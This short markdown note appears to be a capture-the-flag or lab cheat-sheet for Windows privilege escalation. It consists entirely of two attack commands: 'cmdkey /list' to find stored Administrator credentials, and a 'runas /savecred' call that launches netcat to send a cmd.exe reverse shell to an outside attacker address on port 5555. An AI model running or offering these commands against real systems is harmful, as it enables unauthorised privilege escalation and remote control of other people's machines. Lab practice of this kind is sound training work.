
# Find stored credentials
```bash
cmdkey /list
#  User: ACCESS\Administrator
```
-----------------------

# Run command as that user
```bash
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\temp\nc.exe 10.10.14.56 5555 -e cmd.exe"
```
-----------------------
